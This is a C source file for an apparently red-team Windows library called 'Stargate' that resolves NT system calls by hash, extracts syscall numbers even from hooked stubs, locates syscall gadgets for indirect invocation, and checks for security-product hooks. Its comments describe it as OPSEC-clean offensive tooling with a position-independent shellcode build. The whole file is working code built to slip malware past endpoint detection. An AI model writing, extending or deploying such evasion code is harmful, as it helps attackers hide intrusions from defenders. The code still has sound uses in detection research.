/*
 * BM-T1005: Stargate Complete — Library Implementation
 *
 * OPSEC-CLEAN LIBRARY — NO STRINGS, NO DEBUG OUTPUT in production paths.
 *
 * This file implements the unified Stargate API by delegating to the
 * individual technique modules:
 *   - Moonwalk (moonwalk.h) for module discovery
 *   - syscalls.h for SSN extraction + direct stubs
 *   - indirect_syscalls.h for gadget discovery + indirect stubs
 *   - loader.h for hash-based EAT resolution
 *
 * Generic API: Resolve any NT syscall on demand with sg_resolve() or
 * sg_resolve_hash(), then invoke with sg_call_N().
 */

#include "stargate.h"
#include "moonwalk.h"
#include "loader.h"
#include "syscalls.h"
#include "indirect_syscalls.h"

#include <string.h>

/* ========================================================================
 * Internal State
 * ======================================================================== */

static int           g_initialized = 0;
static SgSyscallMode g_mode = SG_INDIRECT;
static HMODULE       g_ntdll = NULL;

/* Shared fallback gadget — found once during sg_init().
 * Per-function gadgets (stored in SgSyscall.gadget) are preferred. */
/* Non-static so bm_spoof.c can access for gadget selection */
void         *g_shared_gadget = NULL;

/* ========================================================================
 * Initialization
 * ======================================================================== */

int sg_init(SgConfig *config)
{
    SgSyscallMode mode = SG_INDIRECT;

    if (config) {
        mode = config->mode;
    }

    /* Step 1: Locate ntdll via Moonwalk — NO PEB WALK */
    g_ntdll = find_module_base(L"ntdll.dll");
    if (!g_ntdll) {
        /* Fallback: PEB walk (BM-T1001) — less stealthy but functional */
        g_ntdll = (HMODULE)locate_base(0x1617909Fu); /* FNV-1a("ntdll.dll") */
        if (!g_ntdll)
            return -1;
    }

    /* Step 2: If indirect mode, find the shared syscall;ret gadget */
    if (mode == SG_INDIRECT) {
        g_shared_gadget = find_syscall_gadget(g_ntdll);
        g_syscall_gadget = g_shared_gadget;
        if (!g_shared_gadget) {
            /* Gadget not found — fall back to direct */
            mode = SG_DIRECT;
        }
    }

    g_mode = mode;
    g_initialized = 1;

    return 0;
}

void sg_cleanup(void)
{
    g_initialized = 0;
    g_ntdll = NULL;
    g_mode = SG_INDIRECT;
    g_shared_gadget = NULL;
    g_syscall_gadget = NULL;
}

int sg_is_initialized(void) { return g_initialized; }

/* ========================================================================
 * Syscall Resolution — Generic, On-Demand
 *
 * sg_resolve():      Resolves by plaintext name (educational use)
 * sg_resolve_hash(): Resolves by FNV-1a hash (production use)
 *
 * Both:
 *   1. Find the function in ntdll's EAT
 *   2. Extract SSN (with Tartarus' Gate fallback if stub is hooked)
 *   3. Find a per-function gadget within 64 bytes of the stub
 * ======================================================================== */

int sg_resolve(const char *func_name, SgSyscall *out)
{
    if (!func_name || !out || !g_ntdll) return -1;

    /* Find the function address in ntdll's Export Address Table */
    void *fn = resolve_export(g_ntdll, func_name);
    if (!fn) return -1;

    /* Extract SSN — with Tartarus' Gate fallback if the stub is hooked */
    DWORD ssn = extract_ssn_with_fallback(fn, g_ntdll);
    if (ssn == 0) return -1;

    out->ssn = ssn;

    /* Find a per-function gadget within the stub's own memory range.
     * NT stubs are ~32 bytes, so 64 is generous. Falls back to shared. */
    out->gadget = find_syscall_gadget_near(fn, 64);

    return 0;
}

int sg_resolve_hash(DWORD func_hash, SgSyscall *out)
{
    if (!out || !g_ntdll || func_hash == 0) return -1;

    /* Find the function address via hash-based EAT resolution (BM-T1001) */
    void *fn = (void *)resolve_addr((HMODULE)g_ntdll, func_hash);
    if (!fn) return -1;

    /* Extract SSN — with Tartarus' Gate fallback */
    DWORD ssn = extract_ssn_with_fallback(fn, g_ntdll);
    if (ssn == 0) return -1;

    out->ssn = ssn;
    out->gadget = find_syscall_gadget_near(fn, 64);

    return 0;
}

/* ========================================================================
 * Syscall Dispatch — sg_call_N
 *
 * Each function:
 *   1. Validates the SgSyscall handle
 *   2. If indirect: sets g_syscall_gadget to per-function gadget (or shared)
 *   3. Calls the appropriate generic stub
 *
 * THREAD SAFETY: g_syscall_gadget is a global written before each call.
 * Acceptable for offensive tooling (typically single-threaded).
 * For multi-threaded use, wrap in a mutex or use TLS.
 * ======================================================================== */

#define SG_VALIDATE(sc) \
    if (!(sc) || (sc)->ssn == 0) return (NTSTATUS)0xC000000DL

/* Set the per-function gadget for indirect mode. Falls back to shared. */
#define SG_SET_GADGET(sc) \
    do { \
        if ((sc)->gadget) g_syscall_gadget = (sc)->gadget; \
        else if (g_shared_gadget) g_syscall_gadget = g_shared_gadget; \
    } while (0)

NTSTATUS sg_call_0(SgSyscall *sc)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_0(sc->ssn);
    }
    return invoke_syscall_0(sc->ssn);
}

NTSTATUS sg_call_1(SgSyscall *sc, void *a1)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_1(sc->ssn, a1);
    }
    return invoke_syscall_1(sc->ssn, a1);
}

NTSTATUS sg_call_2(SgSyscall *sc, void *a1, void *a2)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_2(sc->ssn, a1, a2);
    }
    return invoke_syscall_2(sc->ssn, a1, a2);
}

NTSTATUS sg_call_3(SgSyscall *sc, void *a1, void *a2, void *a3)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_3(sc->ssn, a1, a2, a3);
    }
    return invoke_syscall_3(sc->ssn, a1, a2, a3);
}

NTSTATUS sg_call_4(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_4(sc->ssn, a1, a2, a3, a4);
    }
    return invoke_syscall_4(sc->ssn, a1, a2, a3, a4);
}

NTSTATUS sg_call_5(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                   void *a5)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_5(sc->ssn, a1, a2, a3, a4, a5);
    }
    return invoke_syscall_5(sc->ssn, a1, a2, a3, a4, a5);
}

NTSTATUS sg_call_6(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                   void *a5, void *a6)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_6(sc->ssn, a1, a2, a3, a4, a5, a6);
    }
    return invoke_syscall_6(sc->ssn, a1, a2, a3, a4, a5, a6);
}

NTSTATUS sg_call_7(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                   void *a5, void *a6, void *a7)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_7(sc->ssn, a1, a2, a3, a4, a5, a6, a7);
    }
    return invoke_syscall_7(sc->ssn, a1, a2, a3, a4, a5, a6, a7);
}

NTSTATUS sg_call_8(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                   void *a5, void *a6, void *a7, void *a8)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_8(sc->ssn, a1, a2, a3, a4, a5, a6, a7, a8);
    }
    return invoke_syscall_8(sc->ssn, a1, a2, a3, a4, a5, a6, a7, a8);
}

NTSTATUS sg_call_9(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                   void *a5, void *a6, void *a7, void *a8, void *a9)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_9(sc->ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9);
    }
    return invoke_syscall_9(sc->ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9);
}

NTSTATUS sg_call_10(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                    void *a5, void *a6, void *a7, void *a8, void *a9,
                    void *a10)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_10(sc->ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
    }
    return invoke_syscall_10(sc->ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
}

NTSTATUS sg_call_11(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                    void *a5, void *a6, void *a7, void *a8, void *a9,
                    void *a10, void *a11)
{
    SG_VALIDATE(sc);
    if (g_mode == SG_INDIRECT) {
        SG_SET_GADGET(sc);
        return indirect_syscall_11(sc->ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
    }
    return invoke_syscall_11(sc->ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

/* ========================================================================
 * Module Discovery — Moonwalk / loader wrappers
 * ======================================================================== */

HMODULE sg_find_module(const wchar_t *dll_name)
{
    return find_module_base(dll_name);
}

LPVOID sg_resolve_export(HMODULE module_base, const char *func_name)
{
    return resolve_export(module_base, func_name);
}

LPVOID sg_resolve_by_hash(HMODULE module_base, DWORD func_hash)
{
    return (LPVOID)resolve_addr((LPVOID)module_base, func_hash);
}

/* ========================================================================
 * Hook Detection
 * ======================================================================== */

LPVOID sg_scan_with_hook_detection(
    HMODULE module_base, const unsigned char *signature,
    size_t sig_len, SgHookInfo *hook_info)
{
    HOOK_INFO mw_hook = {0};

    LPVOID result = scan_with_hook_detection(
        module_base, signature, sig_len, 0, &mw_hook);

    if (hook_info) {
        hook_info->is_hooked   = mw_hook.is_hooked;
        hook_info->hook_type   = (SgHookType)mw_hook.hook_type;
        hook_info->hook_offset = mw_hook.hook_offset;
        hook_info->jump_target = mw_hook.jump_target;
        hook_info->bytes_len   = mw_hook.bytes_len;
        hook_info->match_ratio = mw_hook.match_ratio;
        if (mw_hook.bytes_len <= sizeof(hook_info->original_bytes)) {
            memcpy(hook_info->original_bytes, mw_hook.original_bytes, mw_hook.bytes_len);
            memcpy(hook_info->hooked_bytes, mw_hook.hooked_bytes, mw_hook.bytes_len);
        }
    }

    return result;
}

int sg_extract_clean_signature(
    const wchar_t *dll_name, const char *func_name,
    unsigned char *signature_out, size_t sig_size)
{
#if defined(TEMPEST_PIC_SHELLCODE)
    (void)dll_name; (void)func_name; (void)signature_out; (void)sig_size;
    /* BM-T2002 sig_extract needs Win32 IAT for mapping — excluded from no-import PIC. */
    return 0;
#else
    return extract_clean_signature(dll_name, func_name,
                                   (BYTE *)signature_out, sig_size) ? 1 : 0;
#endif
}

/* ========================================================================
 * SSN Extraction
 * ======================================================================== */

DWORD sg_extract_ssn(void *func_addr)
{
    return extract_ssn(func_addr);
}

/* ========================================================================
 * Internal State Access
 * ======================================================================== */

HMODULE sg_get_ntdll_base(void) { return g_ntdll; }
SgSyscallMode sg_get_syscall_mode(void) { return g_mode; }
